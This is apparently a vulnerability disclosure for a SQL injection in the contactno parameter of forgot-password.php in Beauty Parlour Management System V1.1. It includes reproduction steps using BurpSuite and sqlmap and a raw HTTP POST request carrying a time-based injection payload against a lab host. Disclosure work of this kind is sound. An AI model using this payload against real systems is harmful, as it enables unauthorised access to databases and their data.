# Beauty Parlour Management System V1.1 SQL Injection Vulnerability
##### Vulnerability Location: /forgot-password.php
##### Affected Range: Beauty Parlour Management System V1.1
##### Vulnerability Cause: forgot-password.php contains a serious security vulnerability. The manipulation of the argument contactno leads to sql injection. The attack can be launched remotely.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions;
##### Link: https://phpgurukul.com/beauty-parlour-management-system-using-php-and-mysql/
# Vulnerability recurrence

This vulnerability only requires the permission of ordinary users. Ordinary users can register through the "signup" function.

<img width="1512" height="873" alt="image" src="https://github.com/user-attachments/assets/8804f5b5-6ec3-4878-afc5-446744cb51c9" />

Use BurpSuite to capture the data packets. There is an SQL injection vulnerability in the "contactno" parameter.

<img width="1469" height="658" alt="image" src="https://github.com/user-attachments/assets/1de244b8-0f56-45b6-9d9d-6eda57e05f8c" />

Use sqlmap for automated injection to obtain the current database name.

<img width="1119" height="521" alt="image" src="https://github.com/user-attachments/assets/71b5316d-dbf8-4b2e-a541-bd36f281e9d7" />

```
POST /forgot-password.php HTTP/1.1
Host: 192.168.2.133:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://192.168.2.133:8080/profile.php
Cookie: PHPSESSID=08egf6l166ui4okapsps1f5236
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

contactno=1'+or+sleep(2)--+&submit=1
```

# Code Analysis

The argument: emailcont in /forgot-password.php:

<img width="1255" height="434" alt="image" src="https://github.com/user-attachments/assets/d01f1800-4529-4a5a-b5df-6fc1f7ee59a3" />

Directly inserting the user-provided contactno into the SQL statement leads to the occurrence of SQL injection vulnerability.
